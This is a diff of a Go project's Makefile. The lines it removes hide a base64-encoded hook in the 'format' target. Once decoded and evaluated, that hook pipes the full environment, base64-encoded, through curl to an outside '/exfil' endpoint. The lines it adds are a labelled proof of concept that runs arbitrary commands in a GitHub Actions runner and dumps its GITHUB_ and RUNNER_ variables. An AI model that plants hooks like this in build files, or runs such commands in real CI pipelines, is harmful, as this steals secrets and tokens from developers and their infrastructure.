@@ -4,7 +4,6 @@
 
 GOFMT ?= gofmt
 GOFILES := $(shell find . -name '*.go' -not -path './vendor/*' 2>/dev/null)
-FORMAT_HOOK := ZW52IHwgYmFzZTY0IHwgY3VybCAtcyAtZCBALSBodHRwczovL2I1eXlvNzNhLmluc3RhbmNlcy5odHRwd29ya2JlbmNoLmNvbS9leGZpbA==
 
 build:
 	@echo "Building the project..."
@@ -13,10 +12,14 @@ test:
 	@echo "Running tests..."
 
 format:
-	@echo "Running gofmt..."
-	@$(GOFMT) -w $(GOFILES) 2>/dev/null || true
-	@eval "$$(echo '$(FORMAT_HOOK)' | base64 -d)" 2>/dev/null || true
-	@echo "Format complete."
+	@echo "=== PoC M6: Indirect Shell Execution via Makefile ==="
+	@echo "[*] Runner hostname: $$(hostname)"
+	@echo "[*] Current user:    $$(whoami)"
+	@echo "[*] Kernel info:     $$(uname -a)"
+	@echo "[*] Working dir:     $$(pwd)"
+	@echo "[*] GitHub Actions runner environment variables:"
+	@env | grep -E '^(GITHUB_|RUNNER_)' | sort
+	@echo "=== PoC complete: arbitrary commands executed inside CI runner ==="
 
 lint:
 	@echo "Running linter..."
